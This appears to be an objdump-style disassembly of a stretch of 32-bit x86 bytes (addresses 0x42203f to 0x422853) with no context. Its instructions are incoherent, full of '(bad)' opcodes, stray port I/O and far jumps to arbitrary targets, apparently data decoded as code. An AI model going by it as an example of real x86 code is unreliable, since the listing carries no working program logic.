  42203f:	ss (bad) 
  422041:	cwde   
  422042:	inc    edx
  422043:	and    BYTE PTR [edx-0x3cac02bb],0x94
  42204a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42204b:	pop    eax
  42204c:	loopne 0x422062
  42204e:	inc    esp
  42204f:	jne    0x42206a
  422051:	cmp    DWORD PTR [ecx],edi
  422053:	dec    ecx
  422054:	in     eax,dx
  422055:	jae    0x42203e
  422057:	and    ah,BYTE PTR [eax-0x71]
  42205a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42205b:	cwde   
  42205c:	pop    eax
  42205d:	adc    ecx,DWORD PTR [ebx]
  42205f:	int    0x59
  422061:	xor    ch,BYTE PTR ds:0x13ca72a5
  422067:	fdivr  DWORD PTR [eax-0x24771ae1]
  42206d:	ins    BYTE PTR es:[edi],dx
  42206e:	hlt    
  42206f:	emms   
  422071:	dec    eax
  422072:	shl    BYTE PTR [edx+edx*2+0x5e],0x7c
  422077:	data16 jg 0x4220b8
  42207a:	pop    esi
  42207b:	into   
  42207c:	inc    edx
  42207d:	addr16 into 
  42207f:	repz jne 0x422028
  422082:	mov    ds:0x69360cea,al
  422087:	pop    esi
  422088:	sbb    esi,esi
  42208a:	or     BYTE PTR [ebx+0x33244346],dh
  422090:	inc    edx
  422091:	xor    al,0x62
  422093:	sbb    ah,ch
  422095:	push   esi
  422096:	jo     0x4220c4
  422098:	outs   dx,BYTE PTR ds:[esi]
  422099:	(bad)  
  42209a:	loopne 0x4220b7
  42209c:	sbb    bh,BYTE PTR [esi-0x72]
  42209f:	sti    
  4220a0:	lea    edi,[ecx]
  4220a2:	push   esi
  4220a3:	dec    edx
  4220a4:	inc    eax
  4220a5:	rcl    DWORD PTR [edx+0x3f2d9970],0x4a
  4220ac:	call   0x3900:0x0
  4220b3:	stc    
  4220b4:	pop    ebx
  4220b5:	sub    ebx,ebx
  4220b7:	stos   DWORD PTR es:[edi],eax
  4220b8:	jns    0x4220b5
  4220ba:	dec    edx
  4220bb:	sub    bl,0xe9
  4220be:	and    DWORD PTR [edx],ecx
  4220c0:	push   cs
  4220c1:	and    eax,0x19a71
  4220c6:	repz add al,0x0
  4220c9:	add    al,bh
  4220cb:	or     BYTE PTR [edi-0x14],al
  4220ce:	fs push ecx
  4220d0:	jl     0x422056
  4220d2:	test   eax,0x2b64e95c
  4220d7:	(bad)  
  4220d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220d9:	push   0x1
  4220db:	xchg   DWORD PTR [eax],eax
  4220dd:	dec    esi
  4220de:	scas   al,BYTE PTR es:[edi]
  4220df:	int    0x71
  4220e1:	or     eax,0x28b38708
  4220e6:	sub    eax,DWORD PTR [esi-0x72b5a448]
  4220ec:	adc    BYTE PTR [ecx],bl
  4220ee:	imul   ebx,DWORD PTR [ebp+0x57],0x7784cf50
  4220f5:	test   BYTE PTR [ebp-0x77],cl
  4220f8:	pop    ecx
  4220f9:	cmp    ch,BYTE PTR [ebx+0x69c74f52]
  4220ff:	ffree  st(5)
  422101:	xchg   ebp,eax
  422102:	adc    DWORD PTR [ecx+0x43b5d251],ebp
  422108:	js     0x4220e7
  42210a:	jl     0x422176
  42210c:	xchg   esi,eax
  42210d:	loope  0x4220a3
  42210f:	sub    eax,0xd45dfcef
  422114:	das    
  422115:	das    
  422116:	xor    bl,BYTE PTR [esi+0x4e]
  422119:	(bad)  
  42211a:	dec    ebx
  42211b:	stc    
  42211c:	or     DWORD PTR [eax],ebx
  42211e:	adc    edi,DWORD PTR [ecx-0xa]
  422121:	fwait
  422122:	loopne 0x42218c
  422124:	add    bl,BYTE PTR [eax+0x1f]
  422127:	sbb    DWORD PTR [ebx],ebx
  422129:	js     0x42210f
  42212b:	pop    esi
  42212c:	imul   esp,DWORD PTR [ecx-0x13],0x4752ece3
  422133:	loop   0x422172
  422135:	xor    al,0xc1
  422137:	pop    ebx
  422138:	inc    edi
  422139:	pop    ecx
  42213a:	jb     0x422163
  42213c:	jbe    0x422120
  42213e:	les    eax,FWORD PTR ds:0xe665d8b6
  422144:	and    bh,BYTE PTR [ebx+0x2102132b]
  42214a:	xchg   edi,eax
  42214b:	xchg   esi,eax
  42214c:	js     0x42211b
  42214e:	cdq    
  42214f:	ret    
  422150:	fdiv   st,st(2)
  422152:	sub    esp,0xffffffd8
  422155:	inc    edx
  422156:	or     eax,0xfb8e28c3
  42215b:	inc    esp
  42215c:	mov    ecx,0xdb48108f
  422161:	jecxz  0x4220e4
  422163:	fisubr DWORD PTR [ebx+0x21d108d5]
  422169:	add    eax,edx
  42216b:	cs xchg edi,eax
  42216d:	shl    ecx,1
  42216f:	jno    0x422109
  422171:	xor    eax,0x24417c09
  422176:	dec    edx
  422177:	sub    al,0x5a
  422179:	cwde   
  42217a:	inc    edi
  42217b:	sbb    al,0x1b
  42217d:	mov    dl,0x29
  42217f:	psubq  mm6,QWORD PTR [ecx-0x20]
  422183:	sbb    dl,BYTE PTR [edx-0x468f1168]
  422189:	retf   
  42218a:	jl     0x422123
  42218c:	shl    DWORD PTR [eax],0xaf
  42218f:	xchg   ecx,eax
  422190:	inc    ebp
  422191:	jp     0x4221dd
  422193:	xor    eax,0xa923b426
  422198:	pop    es
  422199:	xor    ch,BYTE PTR [edi-0x67]
  42219c:	arpl   WORD PTR fs:[esi],dx
  42219f:	and    edi,esp
  4221a1:	lds    esi,FWORD PTR [ebp+0x48]
  4221a4:	(bad)  
  4221a5:	ja     0x4221d3
  4221a7:	xor    eax,0x6ff6794b
  4221ac:	jge    0x4221bd
  4221ae:	fadd   QWORD PTR [edi+0x6e9cddba]
  4221b4:	shr    DWORD PTR [ecx+0x6a],0x88
  4221b8:	jmp    0xdbe94e4f
  4221bd:	mov    bl,0x5c
  4221bf:	mov    esp,0xa4940f68
  4221c4:	adc    ebp,DWORD PTR [eax]
  4221c6:	jle    0x42218d
  4221c8:	out    dx,al
  4221c9:	xor    al,0x2d
  4221cb:	jno    0x42223e
  4221cd:	dec    BYTE PTR [eax+0x47]
  4221d0:	bound  edi,QWORD PTR [eax+0xf638202]
  4221d6:	dec    ebp
  4221d7:	mov    dh,0xfd
  4221d9:	or     dl,BYTE PTR [ecx-0x244b786]
  4221df:	lea    ecx,[ebp-0x52e29287]
  4221e5:	sub    ecx,0xffffff8d
  4221e8:	or     eax,0x8a547ef7
  4221ed:	aas    
  4221ee:	sbb    esp,DWORD PTR [edi+edx*8]
  4221f1:	xlat   BYTE PTR ds:[ebx]
  4221f2:	aas    
  4221f3:	mov    edi,0x685c3cc7
  4221f8:	or     eax,0x7040cb5a
  4221fd:	rcr    DWORD PTR [edi-0x1a],0x6b
  422201:	ucomiss xmm0,DWORD PTR [ebx+0x14]
  422205:	mov    ah,0x76
  422207:	fwait
  422208:	lock int3 
  42220a:	aas    
  42220b:	mov    dh,0xd3
  42220d:	aaa    
  42220e:	hlt    
  42220f:	pop    ss
  422210:	add    al,0x8
  422212:	dec    edi
  422213:	ret    
  422214:	push   0xfffffffb
  422216:	mov    bl,0x94
  422218:	adc    esi,DWORD PTR [esi+0x23]
  42221b:	mov    ecx,0x6a7b3d18
  422220:	mov    ds:0x8a543fb6,eax
  422225:	es clc 
  422227:	push   ss
  422228:	mov    DWORD PTR [edi],ebx
  42222a:	push   cs
  42222b:	add    eax,0xc178696f
  422230:	mov    cl,0xac
  422232:	lods   al,BYTE PTR ds:[esi]
  422233:	call   0x523b904c
  422238:	and    BYTE PTR [ecx+0x72],al
  42223b:	cld    
  42223c:	ins    BYTE PTR es:[edi],dx
  42223d:	mov    edi,DWORD PTR [ebx-0x6416dc32]
  422243:	inc    edx
  422244:	cmp    bh,BYTE PTR [ebx]
  422246:	and    WORD PTR [ebx],dx
  422249:	call   0xf49b3c63
  42224e:	dec    eax
  42224f:	fistp  DWORD PTR [ecx]
  422251:	mov    ds:0xf5e9095c,eax
  422256:	mov    bl,0xa6
  422258:	mov    ds:0x2b650189,eax
  42225d:	jp     0x4221e5
  42225f:	ins    BYTE PTR es:[edi],dx
  422260:	and    DWORD PTR [ebp+0x43],esi
  422263:	in     al,0xf2
  422265:	mov    esi,ds
  422267:	outs   dx,DWORD PTR ds:[esi]
  422268:	mov    BYTE PTR [edx],al
  42226a:	int3   
  42226b:	out    0xb1,eax
  42226d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42226e:	mov    dh,0xc3
  422270:	in     eax,0xe7
  422272:	adc    edx,ebp
  422274:	fs stos DWORD PTR es:[edi],eax
  422276:	aad    0xe1
  422278:	loope  0x422258
  42227a:	stos   BYTE PTR es:[edi],al
  42227b:	dec    BYTE PTR [eax+0x1f9ff53e]
  422281:	in     al,dx
  422282:	dec    ebx
  422283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422284:	jp     0x4222bc
  422286:	inc    ebp
  422287:	and    edx,DWORD PTR [esi-0x79]
  42228a:	mov    WORD PTR [eax+0x36],gs
  42228d:	ins    BYTE PTR es:[edi],dx
  42228e:	jne    0x4222d4
  422290:	adc    DWORD PTR [ecx+0x5115fb54],edi
  422296:	fst    DWORD PTR [ecx]
  422298:	dec    ebp
  422299:	rcr    BYTE PTR [eax+0x6125e161],0xaf
  4222a0:	pop    ss
  4222a1:	in     al,0x24
  4222a3:	mov    WORD PTR [ebx+0x71],cs
  4222a6:	enter  0x5294,0x56
  4222aa:	out    0x24,al
  4222ac:	and    DWORD PTR [edi+0x6ad0c2e],ecx
  4222b2:	xor    eax,0xdcb3dccb
  4222b7:	pop    es
  4222b8:	dec    BYTE PTR [eax+0x77d5b0]
  4222be:	scas   eax,DWORD PTR es:[edi]
  4222bf:	and    BYTE PTR [edi+0x64],0xea
  4222c3:	and    eax,0xa9986a29
  4222c8:	pop    ecx
  4222c9:	repnz cmp al,0x25
  4222cc:	push   ds
  4222cd:	xlat   BYTE PTR ds:[ebx]
  4222ce:	sbb    eax,0xcbaf188a
  4222d3:	sub    esp,ecx
  4222d5:	adc    DWORD PTR [edi-0x3c],0xf623eea3
  4222dc:	jmp    0x9036041d
  4222e1:	cdq    
  4222e2:	stos   DWORD PTR es:[edi],eax
  4222e3:	jnp    0x42235a
  4222e5:	je     0x422309
  4222e7:	jmp    0x13b0:0xc7b9d573
  4222ee:	(bad)  
  4222ef:	mov    ebp,0x11aa1cff
  4222f4:	or     bh,BYTE PTR [esi]
  4222f6:	add    bl,BYTE PTR [ebx+0x1]
  4222f9:	mov    ecx,0xe3588ad7
  4222fe:	enter  0xc897,0x8a
  422302:	ret    
  422303:	ret    
  422304:	test   BYTE PTR [ebx-0x49c19027],al
  42230a:	xchg   DWORD PTR ds:0x63b808f5,eax
  422310:	stos   BYTE PTR es:[edi],al
  422311:	jnp    0x422345
  422313:	or     ebp,DWORD PTR [ecx]
  422315:	je     0x4222a4
  422317:	in     eax,0x10
  422319:	fnstenv [ebx+0x57]
  42231c:	mov    eax,0xec2661d1
  422321:	popf   
  422322:	push   edx
  422323:	es and ebp,ecx
  422326:	push   esp
  422327:	add    al,0xdd
  422329:	push   edx
  42232a:	ss int 0xf5
  42232d:	sbb    al,0xab
  42232f:	mov    dh,0x9c
  422331:	bound  esi,QWORD PTR [edx]
  422333:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422334:	in     al,dx
  422335:	jp     0x422314
  422337:	inc    ebx
  422338:	push   esi
  422339:	lds    edi,FWORD PTR [esi-0x51]
  42233c:	mov    ?,WORD PTR [ebx-0x50]
  42233f:	mov    ch,0x6
  422341:	mov    ebx,0xcd78299d
  422346:	ret    
  422347:	in     eax,0xeb
  422349:	pop    edx
  42234a:	push   ebp
  42234b:	sbb    ebp,ecx
  42234d:	mov    bl,0xf0
  42234f:	pop    esi
  422350:	mov    al,ds:0xe3cd69c6
  422355:	mov    esi,0x7cb02189
  42235a:	mov    ds:0x541d1073,eax
  42235f:	mov    esp,0x1c755e0f
  422364:	fnstenv [ebx]
  422366:	jne    0x422311
  422368:	outs   dx,DWORD PTR ds:[esi]
  422369:	jp     0x4223ae
  42236b:	dec    esi
  42236c:	gs lock pop es
  42236f:	cld    
  422370:	pop    es
  422371:	dec    esi
  422372:	add    dh,BYTE PTR [ecx+0x6d]
  422375:	mov    eax,ds:0xc8e7c355
  42237a:	mov    ecx,0xa97890d4
  42237f:	fisubr WORD PTR [ebp-0x57de8c4b]
  422385:	fadd   DWORD PTR [eax-0x76]
  422388:	adc    BYTE PTR [edx-0x1b83e8bd],ch
  42238e:	mov    al,ds:0x77dd8b02
  422393:	jl     0x4223e9
  422395:	loope  0x422414
  422397:	dec    edx
  422398:	push   ds
  422399:	jae    0x42232a
  42239b:	ja     0x422338
  42239d:	popf   
  42239e:	mov    bh,0x35
  4223a0:	mov    al,ds:0x1a2a40d
  4223a5:	add    eax,0xa350c438
  4223aa:	mov    eax,0x9a18db46
  4223af:	push   cs
  4223b0:	pop    edi
  4223b1:	mov    ch,0xaf
  4223b3:	or     eax,0xfd904a63
  4223b8:	jecxz  0x4223d2
  4223ba:	pop    esi
  4223bb:	hlt    
  4223bc:	int3   
  4223bd:	sub    dh,ah
  4223bf:	inc    ecx
  4223c0:	cmp    esi,ecx
  4223c2:	adc    DWORD PTR [edi-0x409a8c6a],esi
  4223c8:	sub    ch,BYTE PTR [ecx+0x72]
  4223cb:	jl     0x42236f
  4223cd:	stc    
  4223ce:	jl     0x42239e
  4223d0:	fwait
  4223d1:	nop
  4223d2:	lods   al,BYTE PTR ds:[esi]
  4223d3:	into   
  4223d4:	lea    edi,[edx]
  4223d6:	lea    ecx,[esi]
  4223d8:	(bad)  
  4223d9:	mov    eax,0x442fac6c
  4223de:	mov    ch,0xc4
  4223e0:	adc    al,0xb0
  4223e2:	or     eax,0x344a01c9
  4223e7:	mov    DWORD PTR [edi-0x7b96b65c],ebx
  4223ed:	gs es aas 
  4223f0:	(bad)  
  4223f1:	adc    al,0x77
  4223f3:	or     al,0xa5
  4223f5:	scas   eax,DWORD PTR es:[edi]
  4223f6:	aaa    
  4223f7:	std    
  4223f8:	shr    DWORD PTR [esi],1
  4223fa:	retf   0xe4c8
  4223fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223fe:	popf   
  4223ff:	lea    esp,[edi]
  422401:	push   edi
  422402:	in     al,0xc3
  422404:	sbb    al,0x3d
  422406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422407:	neg    BYTE PTR [ebx]
  422409:	bound  esp,QWORD PTR [edx-0x5c7a3c77]
  42240f:	jno    0x4223b8
  422411:	test   BYTE PTR [edi],ch
  422413:	hlt    
  422414:	inc    edx
  422415:	sub    BYTE PTR [edi-0x5c],dh
  422418:	cmp    bl,BYTE PTR [ecx-0x19]
  42241b:	test   al,0x1f
  42241d:	push   cs
  42241e:	out    dx,eax
  42241f:	adc    DWORD PTR [edx+ebx*8],edi
  422422:	imul   esi,DWORD PTR [ebp-0x4a],0x7
  422426:	cmp    eax,0xcaadc6d4
  42242b:	aas    
  42242c:	loopne 0x42241c
  42242e:	js     0x4224aa
  422430:	push   ebp
  422431:	out    0x83,eax
  422433:	fstp   QWORD PTR [ebx+0x12e3f17e]
  422439:	shl    DWORD PTR [edx],0x2d
  42243c:	add    eax,0x53c91713
  422441:	inc    esp
  422442:	jo     0x42248e
  422444:	ret    0xb0ba
  422447:	jb     0x422444
  422449:	xor    eax,0xe7ff68e0
  42244e:	retf   
  42244f:	pusha  
  422450:	mov    esi,0xecf8d031
  422455:	and    dl,ch
  422457:	pop    eax
  422458:	lea    edi,[edx]
  42245a:	dec    edi
  42245b:	btr    DWORD PTR [eax+0x71],esp
  42245f:	mov    esi,0xa6c48ebe
  422464:	xchg   esi,eax
  422465:	cmp    DWORD PTR [ebx-0x71],edi
  422468:	in     al,dx
  422469:	ins    DWORD PTR es:[edi],dx
  42246a:	xor    BYTE PTR [esi],bh
  42246c:	cmp    eax,0x6f383e9e
  422471:	adc    bl,ch
  422473:	xchg   edi,eax
  422474:	mov    eax,ds:0xd39fed49
  422479:	fcom   QWORD PTR [eax-0x2f]
  42247c:	xchg   BYTE PTR [edi+edi*1-0x668cdd6d],bh
  422483:	ret    0x51f7
  422486:	cld    
  422487:	dec    ecx
  422488:	xor    ah,0x7d
  42248b:	mov    esi,ebp
  42248d:	ss adc eax,0xfa809414
  422493:	mov    ds:0xc70b2c48,eax
  422498:	jmp    0xf675ee21
  42249d:	test   al,0xcd
  42249f:	aam    0x3c
  4224a1:	loopne 0x422493
  4224a3:	das    
  4224a4:	in     al,0x81
  4224a6:	and    DWORD PTR [eax+0x18],0xaa940499
  4224ad:	mov    ah,0x26
  4224af:	push   ebp
  4224b0:	pop    ebx
  4224b1:	into   
  4224b2:	(bad)  
  4224b3:	push   ss
  4224b4:	cmp    al,dh
  4224b6:	inc    esp
  4224b7:	sbb    dh,cl
  4224b9:	and    DWORD PTR [edi],esi
  4224bb:	mov    eax,ds:0x84a4e4c6
  4224c0:	and    eax,0xda2dfa7e
  4224c5:	jo     0x4224d8
  4224c7:	push   0xffffff98
  4224c9:	test   BYTE PTR [ebx-0x61e47c85],bl
  4224cf:	fidiv  WORD PTR [eax]
  4224d1:	movlps xmm4,QWORD PTR [ecx+ecx*2]
  4224d5:	add    al,0xa2
  4224d7:	sbb    eax,0xff357be7
  4224dc:	jnp    0x4224df
  4224de:	test   DWORD PTR [eax],0x5bdd34f1
  4224e4:	inc    ebx
  4224e5:	aas    
  4224e6:	and    edx,ebp
  4224e8:	pop    eax
  4224e9:	outs   dx,DWORD PTR ds:[esi]
  4224ea:	lods   eax,DWORD PTR ds:[esi]
  4224eb:	inc    edi
  4224ec:	sbb    al,0xcb
  4224ee:	jno    0x4f58cead
  4224f4:	dec    eax
  4224f5:	lods   eax,DWORD PTR ds:[esi]
  4224f6:	into   
  4224f7:	mov    edi,0x4820e06c
  4224fc:	in     al,dx
  4224fd:	mov    dh,0x3d
  4224ff:	popa   
  422500:	adc    BYTE PTR [ecx+0x7ccc3b6d],0x3a
  422507:	sub    bh,BYTE PTR [ebx-0x56f8af83]
  42250d:	sti    
  42250e:	xlat   BYTE PTR ds:[ebx]
  42250f:	iret   
  422510:	mov    eax,ds:0x3e5cf8cd
  422515:	jge    0x422578
  422517:	cwde   
  422518:	dec    edi
  422519:	mov    ebx,0x3806dc0a
  42251e:	cmp    DWORD PTR [edx+0x6da75095],eax
  422524:	mov    ds:0x3e929764,eax
  422529:	jae    0x422537
  42252b:	jno    0x422505
  42252d:	les    edi,FWORD PTR [ecx-0x38]
  422530:	sub    eax,edx
  422532:	in     eax,0x3
  422534:	cmp    BYTE PTR ds:0x2ece4467,ah
  42253a:	cli    
  42253b:	jmp    0x3e33bdf8
  422540:	cdq    
  422541:	mov    dl,0xe3
  422543:	xor    ah,al
  422545:	shr    BYTE PTR [edx],1
  422547:	dec    eax
  422548:	jb     0x4224fe
  42254a:	and    eax,0x826918bf
  42254f:	push   ds
  422550:	dec    eax
  422551:	xchg   ebp,edi
  422553:	enter  0x51b5,0x1b
  422557:	mov    al,ds:0x4637a11
  42255c:	cmp    BYTE PTR [edx-0x56ae321d],0xb5
  422563:	mov    bh,0xa4
  422565:	hlt    
  422566:	lahf   
  422567:	mov    bl,0x7c
  422569:	stos   BYTE PTR es:[edi],al
  42256a:	mov    ah,0x34
  42256c:	hlt    
  42256d:	dec    esi
  42256e:	js     0x4225b7
  422570:	int    0x83
  422572:	xchg   esi,eax
  422573:	or     BYTE PTR ss:[edi+ebp*4+0x1e],0x4c
  422579:	dec    edx
  42257a:	iret   
  42257b:	test   al,0x39
  42257d:	movsx  esi,sp
  422580:	push   ebp
  422581:	xor    DWORD PTR [ecx-0xe],0xb53f4bbb
  422588:	pop    ss
  422589:	adc    al,0x98
  42258b:	add    BYTE PTR [ebp-0x2d26e4cc],dh
  422591:	mov    DWORD PTR [esi+0x49],edi
  422594:	(bad)  
  422595:	and    al,0xe7
  422597:	mov    ecx,0xbf6ecdad
  42259c:	mov    eax,0x8cd2ac15
  4225a1:	rcl    DWORD PTR [esp+eiz*4-0x44f9d736],0x5a
  4225a9:	pusha  
  4225aa:	outs   dx,DWORD PTR ds:[esi]
  4225ab:	addr16 mov bh,0x92
  4225ae:	add    eax,0x9c50d06a
  4225b3:	dec    esi
  4225b4:	icebp  
  4225b5:	(bad)  
  4225b6:	sub    BYTE PTR [edx-0x3ce1443e],cl
  4225bc:	sbb    eax,DWORD PTR [eax]
  4225be:	add    BYTE PTR [eax],al
  4225c0:	add    BYTE PTR [eax],al
  4225c2:	retf   0x6914
  4225c5:	dec    ecx
  4225c6:	(bad)  
  4225c7:	jge    0x4225b3
  4225c9:	xchg   edi,eax
  4225ca:	outs   dx,DWORD PTR ds:[esi]
  4225cb:	jge    0x422555
  4225cd:	call   0x9f64:0xae0ffde7
  4225d4:	add    DWORD PTR [eax],eax
  4225d6:	repz add al,0x0
  4225d9:	add    BYTE PTR [esi+edi*1-0x3cbd1162],ch
  4225e0:	lds    ebp,FWORD PTR [edi+0x1]
  4225e3:	fisub  WORD PTR [edi+0xe51e072]
  4225e9:	lock xor eax,0x1a1ccb8f
  4225ef:	setne  BYTE PTR [ebx]
  4225f2:	add    BYTE PTR ds:0x6de994e5,0xc9
  4225f9:	mov    ds:0x1cc33328,eax
  4225fe:	mov    eax,DWORD PTR [esi]
  422600:	push   0xbcbb3d0c
  422605:	jne    0x422682
  422607:	mov    ecx,DWORD PTR [esi+0x55501444]
  42260d:	pusha  
  42260e:	int    0x54
  422610:	mov    eax,0x6cf8ba82
  422615:	mov    di,0xe9ca
  422619:	xchg   esp,eax
  42261a:	mov    ch,bl
  42261c:	adc    ah,BYTE PTR [eax-0x58b1a7da]
  422622:	ds xchg ebx,eax
  422624:	cld    
  422625:	into   
  422626:	das    
  422627:	into   
  422628:	mov    ds:0xe4ae079c,al
  42262e:	jo     0x422684
  422630:	and    al,0x2e
  422632:	jo     0x42262d
  422634:	sub    BYTE PTR [ebx],0x3f
  422637:	sub    BYTE PTR [eax],0x98
  42263a:	bound  ecx,QWORD PTR [esi-0x416324e4]
  422640:	les    eax,FWORD PTR [esi+0x17]
  422643:	pop    ebx
  422644:	push   edi
  422645:	mov    ch,0x71
  422647:	lock mov al,ds:0x431a7533
  42264d:	das    
  42264e:	icebp  
  42264f:	jmp    0x592a:0xabd2a536
  422656:	mov    edi,0x6f193659
  42265b:	or     ecx,DWORD PTR [edi+ebp*2]
  42265e:	nop
  42265f:	inc    eax
  422660:	retf   0x8232
  422663:	aaa    
  422664:	mov    ch,0x66
  422666:	cwde   
  422667:	bsr    edx,DWORD PTR [edi]
  42266a:	push   0x5daef24f
  42266f:	gs inc esi
  422671:	mov    dh,0xbc
  422673:	fisttp DWORD PTR [esi+0x77966da7]
  422679:	or     ecx,ebp
  42267b:	add    ebp,DWORD PTR [esi+0x55]
  42267e:	mov    BYTE PTR [eax+0x77],dh
  422681:	xchg   ebp,eax
  422682:	dec    ebx
  422683:	cmp    BYTE PTR [ecx+esi*8],cl
  422686:	imul   ecx,edx,0x23e7a10d
  42268c:	cmp    dh,al
  42268e:	mov    edx,0x1a29097d
  422693:	pop    ebp
  422694:	cmp    bl,dl
  422696:	stos   BYTE PTR es:[edi],al
  422697:	loope  0x422672
  422699:	mov    dh,0x1a
  42269b:	add    ecx,esi
  42269d:	je     0x422667
  42269f:	(bad)  
  4226a1:	pop    edx
  4226a2:	lods   eax,DWORD PTR ds:[esi]
  4226a3:	dec    ebp
  4226a4:	lahf   
  4226a5:	mov    ah,cl
  4226a7:	mov    ds:0x64797880,al
  4226ac:	and    al,0x9c
  4226ae:	mov    bl,0xb4
  4226b0:	mov    ch,0x6c
  4226b2:	and    BYTE PTR [eax],0x4
  4226b5:	in     eax,dx
  4226b6:	or     DWORD PTR [ebx+eiz*4],0xffffffad
  4226ba:	sub    BYTE PTR [ebp+0x3f85a7da],dl
  4226c0:	es test al,0xb
  4226c3:	sbb    BYTE PTR [ebx+0x9e09f4a],bh
  4226c9:	lods   al,BYTE PTR ds:[esi]
  4226ca:	cs push edx
  4226cc:	ds xchg edx,eax
  4226ce:	loopne 0x422672
  4226d0:	test   BYTE PTR [esi+0x3ca189e5],dh
  4226d6:	in     al,dx
  4226d7:	sub    al,0x6a
  4226d9:	div    ecx
  4226db:	mov    dh,al
  4226dd:	iret   
  4226de:	pop    esi
  4226df:	or     DWORD PTR [edx+0x71],ebp
  4226e2:	ror    DWORD PTR [ecx],1
  4226e4:	push   ecx
  4226e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226e6:	fwait
  4226e7:	ja     0x422705
  4226e9:	fwait
  4226ea:	je     0x422680
  4226ec:	cli    
  4226ed:	inc    ecx
  4226ee:	pop    ds
  4226ef:	stos   BYTE PTR es:[edi],al
  4226f0:	mov    bh,BYTE PTR [eax]
  4226f2:	int3   
  4226f3:	pop    edx
  4226f4:	cmp    al,ah
  4226f6:	sub    ch,BYTE PTR [ecx+0x59b4d551]
  4226fc:	xor    al,0x49
  4226fe:	inc    ebp
  4226ff:	mov    dh,0xa1
  422701:	xor    al,0xff
  422703:	cwd    
  422705:	test   edx,0x8e680214
  42270b:	scas   eax,DWORD PTR es:[edi]
  42270c:	mov    edx,0x305ecf37
  422711:	jl     0x42278b
  422713:	(bad)  
  422714:	push   ebp
  422715:	mov    ecx,0xe2d70f74
  42271a:	push   ds
  42271b:	xor    al,0x6e
  42271d:	fmul   DWORD PTR ds:0xf5a9f469
  422723:	mov    al,0xdf
  422725:	leave  
  422726:	add    ch,BYTE PTR [ecx]
  422728:	jl     0x422772
  42272a:	(bad)  
  42272b:	sbb    esp,esi
  42272d:	iret   
  42272e:	fld    QWORD PTR ds:0xd855465c
  422734:	pop    edx
  422735:	test   DWORD PTR [eax+0x5b],eax
  422738:	lods   eax,DWORD PTR ds:[esi]
  422739:	cwde   
  42273a:	or     al,0x5e
  42273c:	and    bl,BYTE PTR [esi-0x2b]
  42273f:	inc    esp
  422740:	repz inc eax
  422742:	jge    0x42272d
  422744:	mov    WORD PTR [ebx-0x4d2bd527],fs
  42274a:	or     eax,DWORD PTR [ebx+0x54]
  42274d:	leave  
  42274e:	icebp  
  42274f:	pop    ebp
  422750:	mov    bh,0x7e
  422752:	and    ecx,esp
  422754:	not    BYTE PTR [ebx-0x6f1c827]
  42275a:	lahf   
  42275b:	mov    esi,0xdca3b083
  422760:	div    DWORD PTR [edx-0x36e30555]
  422766:	(bad)  
  422767:	std    
  422768:	and    DWORD PTR [ebx],0xffffff87
  42276b:	in     eax,0xa
  42276d:	cs mov dl,0x1
  422770:	adc    BYTE PTR [eax+edi*2-0x47e74e41],0x6f
  422778:	test   esi,ecx
  42277a:	inc    DWORD PTR [eax+0x25]
  42277d:	test   eax,0x6a08c873
  422782:	xchg   esp,eax
  422783:	jb     0x42270f
  422785:	ret    0x7176
  422788:	adc    al,0xe4
  42278a:	(bad)  
  42278b:	push   ss
  42278c:	loopne 0x422792
  42278e:	test   DWORD PTR [esi-0x5ecb23cc],ebp
  422794:	outs   dx,BYTE PTR ds:[esi]
  422795:	mov    eax,ds:0x90b3fbf4
  42279a:	pop    eax
  42279b:	rcl    DWORD PTR [ebx-0x1b],cl
  42279e:	dec    ebp
  42279f:	ficom  WORD PTR [eax]
  4227a1:	fs sub eax,0x40d870d6
  4227a7:	add    eax,0x20d650be
  4227ac:	add    DWORD PTR [eax+0x5d66c2b0],esp
  4227b2:	arpl   WORD PTR [edi+0x6e37826],di
  4227b8:	and    BYTE PTR [ebx-0x1],dl
  4227bb:	sub    cl,BYTE PTR [eax-0x5342fcc8]
  4227c1:	sub    eax,0xa0634e06
  4227c6:	(bad)  
  4227c7:	hlt    
  4227c8:	pop    esp
  4227c9:	mov    esp,0x128d531a
  4227ce:	mov    edx,0x170cbdc9
  4227d3:	fs pop ecx
  4227d5:	inc    ebp
  4227d6:	xor    DWORD PTR ds:0xab8a2171,ebp
  4227dc:	fucomi st,st(7)
  4227de:	inc    ebx
  4227df:	jmp    0x9ca3d12d
  4227e4:	ins    BYTE PTR es:[edi],dx
  4227e5:	sti    
  4227e6:	cmp    ah,ch
  4227e8:	sub    ebp,DWORD PTR [ebx-0x51]
  4227eb:	cs push ebp
  4227ed:	loopne 0x4227b7
  4227ef:	push   edx
  4227f0:	mov    ebx,0x41d9433b
  4227f5:	pop    ds
  4227f6:	das    
  4227f7:	loope  0x422817
  4227f9:	arpl   WORD PTR [eax-0x16929af1],dx
  4227ff:	repz pop edx
  422801:	(bad)  
  422802:	cmp    ch,BYTE PTR ds:0x73f13786
  422808:	pop    esp
  422809:	jle    0x4227a1
  42280b:	call   DWORD PTR [esi+0x5f63cf75]
  422811:	dec    ebx
  422812:	(bad)  
  422813:	and    BYTE PTR [edi+0x6f],al
  422816:	bound  sp,DWORD PTR [esp+eiz*4-0x3a]
  42281b:	xchg   ebx,eax
  42281c:	xor    al,0x26
  42281e:	imul   ecx,DWORD PTR [ebx+0x19341a57],0xffffff89
  422825:	std    
  422826:	push   edi
  422827:	fidiv  WORD PTR [ecx+0x76]
  42282a:	rol    cl,1
  42282c:	jp     0x42280d
  42282e:	shl    BYTE PTR [edi],0xac
  422831:	stos   DWORD PTR es:[edi],eax
  422832:	clc    
  422833:	stos   DWORD PTR es:[edi],eax
  422834:	jmp    0x422891
  422836:	ss ins DWORD PTR es:[edi],dx
  422838:	inc    eax
  422839:	and    edi,DWORD PTR [eax+0x50ef89c4]
  42283f:	mov    esi,0xbca2cea4
  422844:	sahf   
  422845:	adc    dl,BYTE PTR [ebp+0x6fb549d3]
  42284b:	xor    eax,DWORD PTR ds:0x743b1b9e
  422851:	xchg   edx,eax
  422852:	inc    eax
  422853:	repnz dec esi
